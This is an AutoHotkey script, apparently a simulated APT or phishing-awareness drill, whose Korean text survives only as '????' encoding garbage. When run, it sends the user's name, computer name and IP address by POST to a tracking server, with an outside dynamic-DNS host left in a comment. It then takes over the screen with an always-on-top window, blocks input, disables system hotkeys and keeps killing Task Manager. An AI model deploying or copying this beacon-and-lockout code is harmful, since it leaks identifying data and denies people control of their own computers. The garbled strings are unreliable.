#NoEnv
#SingleInstance Force

; ????? url
;url = http://abl_shinabro.mooo.com:33033/fileclick
;url = http://192.168.219.120:30000/fileclick
url = http://127.0.0.1:8080/fileclick

; ????????
userName = %A_UserName%
computerName = %A_ComputerName%
ip = %A_IPAddress1%

; ??????? ????? ???? ????
data = userName=%userName%&computerName=%computerName%&ip=%ip%
winHttp := ComObjCreate("WinHttp.WinHttpRequest.5.1")
winHttp.Open("POST", url)
winHttp.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
winHttp.Send(data)
winHttp.WaitForResponse()
response := winHttp.ResponseText 


; ???? ?? ??? ???? >>> !!!!!??? ?? time ???? ???!!!!!
; cnt = 600
cnt = 5

; ???????? ????
key := "a"

Loop
{
	URLDownloadToFile, http://127.0.0.1:8080/fileclick/download/JJAL.jpg, memo.jpg
	if not ErrorLevel
		break
}

widsize = %A_ScreenWidth%
imgw := (widsize // 2)-370

Gui, Add, Picture, x0 y0 w610 h385,JJAL.jpg
Gui, Font, S30 C000000 +Center Bold, ???? ????
Gui, Add, Text, x0 y100 w%A_ScreenWidth% h53 +Center, [ABL ???? APT ??? ??????? ???? ??]
Gui, Font, S20 C000000, ???? ????
Gui, Add, Text, x0 y180 w%A_ScreenWidth% h35 +Center , ?? PC?? ???? ?????? ????????????.
Gui, Add, Text, x0 y220 w%A_ScreenWidth% h35 +Center , ?? ???? PC???? ???????? ?? ????????? ?????? ??????.
Gui, Add, Text, x0 y260 w%A_ScreenWidth% h35 +Center , ?? ???? PC?? ???? ??? ?????? PC?? ?????? ??????? ??????.
Gui, Font, S20 C000000 Bold, ???? ????
Gui, Add, Text, x0 y320 w%A_ScreenWidth% h35 +Center , ?? ???? ?????? ???????? ???? PC????? 5?м╤? ???????.
Gui, Add, Text, x0 y360 w%A_ScreenWidth% h35 +Center vcnt, %cnt% ??? ???? ?ии? PC ????? ????????.
Gui, Font, S15 C000000, ???? ????
Gui, Add, Picture, x%imgw% y450 +Center, memo.png
Gui, Font, S25 C000000, ???? ????
Gui, Add, Text, x0 y710 w%A_ScreenWidth% h43 +Center, ???? ????????? ?????????????? ???????? ??????.

SetTimer, call, 1000
SetTimer, TaskManager, 100

Gui, Color, FFFFFF
Gui, +LastFound +AlwaysOnTop -Caption +ToolWindow
Gui, Show, Maximize
FileDelete, memo.png

; ???? ????
call:
{
	GuiControl, , cnt, %cnt% ??? ???? ?ии? ????? ????????.
	if cnt = 0
	{
		SetTimer, call, Off
		GuiClose:
			ExitApp
	}
	cnt--
}

; ????? ????
LWin:: return		; Left Win
RWin:: return		; Right Win
#D:: return			; Win + D
!Tab:: return		; Alt + Tab
#Tab:: return		; Win + Tab
!F4:: return		; Alt + F4
^+Esc:: return		; Ctrl + Shift + Esc
^+F12:: ExitApp		; ???ес?? ???????? (???)

; ????????? ????
TaskManager:
{
	BlockInput, On
	WinClose, Windows ??? ??????
	WinClose, ??? ??????
	Process, Close, Taskmgr.exe
	Process, Close, C:\Windows\System32\Taskmgr.exe
}